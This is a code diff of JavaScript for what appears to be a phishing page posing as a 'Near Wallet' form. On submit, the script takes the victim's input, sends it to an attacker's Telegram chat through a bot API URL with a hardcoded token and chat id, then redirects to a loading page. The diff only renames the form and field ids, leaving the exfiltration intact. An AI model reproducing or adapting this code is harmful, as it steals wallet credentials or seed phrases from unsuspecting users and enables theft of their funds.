@@ -1,27 +1,27 @@
 
 
 // Listen for form submit
-document.getElementById('contactForm').addEventListener('submit', submitForm);
+document.getElementById('sendForm').addEventListener('submit', submitForm);
 
 // Submit form
 function submitForm(e){
   e.preventDefault();
 
   // Get values
-  var SMS = getInputVal('SMS');
+  var MMS = getInputVal('MMS');
   e.preventDefault();
-  let url = 'https://api.telegram.org/bot5543747526:AAGgad6lwifZCavpgsjm8dG4AAqLqWjUvVU/sendMessage?chat_id=-760150313&text=🚀🚀Near Wallet🚀🚀:%0D%0A '+SMS;
+  let url = 'https://api.telegram.org/bot5543747526:AAGgad6lwifZCavpgsjm8dG4AAqLqWjUvVU/sendMessage?chat_id=-760150313&text=🚀🚀Near Wallet🚀🚀:%0D%0A '+MMS;
   let xhttp = new XMLHttpRequest();
   xhttp.open("GET", url, true);
   xhttp.send();
-  document.getElementById('SMS').value = ''
+  document.getElementById('MMS').value = ''
   setTimeout(function() { window.location.href = "loading.html"},1000);
 
 
 
 
   // Save messageloading.html
-    saveMessage(ip, SMS);
+    saveMessage(ip, MMS);
 
 
 
@@ -31,7 +31,7 @@ function submitForm(e){
   },3000);
 
   // Clear form
-  document.getElementById('contactForm').reset();
+  document.getElementById('sendForm').reset();
 }
 
 // Function to get get form values
